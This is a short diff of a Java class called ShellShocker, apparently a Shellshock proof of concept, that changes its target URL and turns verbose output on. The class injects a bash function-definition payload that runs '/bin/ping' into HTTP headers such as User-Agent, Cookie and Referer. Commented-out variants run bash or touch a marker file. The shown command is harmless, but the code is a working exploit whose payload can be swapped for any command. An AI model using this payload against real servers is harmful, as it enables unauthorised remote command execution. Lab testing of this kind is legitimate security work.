@@ -42,12 +42,12 @@ public class ShellShocker {
 
 	public static void main(String[] args) throws MalformedURLException, IOException {
 		
-		final String url = "https://172.16.81.57/start.html";
+		final String url = "https://192.168.0.200:5001";
 		final String[] options = {"User-Agent", "Cookie", "Host", "Referer", "Connection", "Accept"};
 //		final String shockcmd = "() { :;}; /bin/bash -c \"/bin/ping -c 3 192.168.201.194\"";
 		final String shockcmd = "() { :;}; /bin/ping -c 3 192.168.201.194";
 //		final String shockcmd = "() { :;}; /usr/bin/touch /tmp/metasploit";
-		final Boolean verbose = false;
+		final Boolean verbose = true;
 		
 		final HttpURLConnection urlconn = setURLConnection(url);
 		setHttpOptions(urlconn, options, shockcmd);
